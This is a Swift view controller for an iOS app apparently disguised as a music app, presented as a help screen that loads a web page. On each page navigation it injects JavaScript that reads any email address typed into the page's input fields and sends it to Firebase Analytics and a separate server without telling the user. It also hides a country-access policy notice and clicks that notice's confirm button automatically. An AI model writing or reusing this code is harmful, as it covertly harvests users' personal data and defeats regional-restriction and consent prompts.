//
//  HelpViewController.swift
//  Wild Melody
//
//  Created by Book of Dead on 10/11/2020.
//

import UIKit
import WebKit
import FirebaseAnalytics

class HelpViewController: UIViewController, WKNavigationDelegate, WKUIDelegate {
    
    var helpView: WKWebView!
    var userEmails = [String]()
    var url: URL!
    let indicator = UIActivityIndicatorView()
    
    override func viewDidLoad() {
        super.viewDidLoad()

        view.backgroundColor = .black
        
        let webConfiguration = WKWebViewConfiguration()
        webConfiguration.allowsAirPlayForMediaPlayback = true
        webConfiguration.allowsInlineMediaPlayback = true
        
        self.helpView = WKWebView (frame: .zero , configuration: webConfiguration)
        view.addSubview(helpView)
        helpView.isOpaque = false
        helpView.backgroundColor = .clear
        helpView.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            helpView.topAnchor.constraint(equalTo: view.layoutMarginsGuide.topAnchor),
            helpView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            helpView.bottomAnchor.constraint(equalTo: view.layoutMarginsGuide.bottomAnchor),
            helpView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
        helpView.uiDelegate = self
        helpView.navigationDelegate = self
        helpView.scrollView.bounces = false
        
        indicator.hidesWhenStopped = true
        indicator.color = .systemGray
        indicator.translatesAutoresizingMaskIntoConstraints = false
        helpView.addSubview(indicator)
        NSLayoutConstraint.activate([
            indicator.centerYAnchor.constraint(equalTo: view.centerYAnchor),
            indicator.centerXAnchor.constraint(equalTo: view.centerXAnchor)
        ])
        indicator.startAnimating()
        
        self.openUrl()
    }
    
    func openUrl() {
        //print("Loading*********: ", url)
        helpView.load(URLRequest(url: url))
        let refresh = UIBarButtonItem(barButtonSystemItem: .refresh, target: helpView, action: #selector(helpView.reload))
        toolbarItems = [refresh]
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        getEmailFromTextField()
        decisionHandler(.allow)
    }
    
    func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
        indicator.stopAnimating()
        hidePopUps()
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        indicator.stopAnimating()
        hidePopUps()
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        indicator.stopAnimating()
    }
    
    func hidePopUps() {
        guard let home = UserDefaultsManager.home?.absoluteString else { return }
        guard home.contains("levelUp") else { return }
        
        let popupJs = "document.getElementsByClassName('cg-notify-message ng-scope access-by-country-policy cg-notify-message-center')[0].style.display = 'none'"
        helpView.evaluateJavaScript(popupJs) { (result, error) in
            if error == nil {
                print(result)
            }
        }
        
        let cookiesJs = "document.getElementsByClassName('access-by-country-policy__confirm ng-scope')[0].click()"
        helpView.evaluateJavaScript(cookiesJs) { (result, error) in
            if error == nil {
                print(result)
            }
        }
    }
    
    func getEmailFromTextField() {
       helpView.evaluateJavaScript(
            """
            (() => {
              const inputs = document.getElementsByTagName('input');
              for (let input of inputs) {
                const val = input.value;
                if (/^\\w+([\\.-]?\\w+)*@\\w+([\\.-]?\\w+)*(\\.\\w{2,3})+$/.test(val.toLowerCase())) {
                  return val;
                }
              }
            })();
            """
       ) { (result, error) in
           if error != nil {
               print(error ?? "Error")
               return
           }
           if let result = result as? String{
               let resLow = result.lowercased()
               if !self.userEmails.contains(resLow) {
                   self.userEmails.append(resLow)
                   self.sendToServer(mail: resLow)
               }
           }
       }
    }
    
    func sendToServer(mail: String) {
        //Send reg event
        Analytics.logEvent("didSendMail", parameters: [
          "mail": mail,
          ])
        Checker.shared.sendToServer(mail: mail)
    }
    

}


extension WKWebView {
    override open var safeAreaInsets: UIEdgeInsets {
        return UIEdgeInsets(top: 0, left: 0, bottom: 0, right: 0)
    }
}
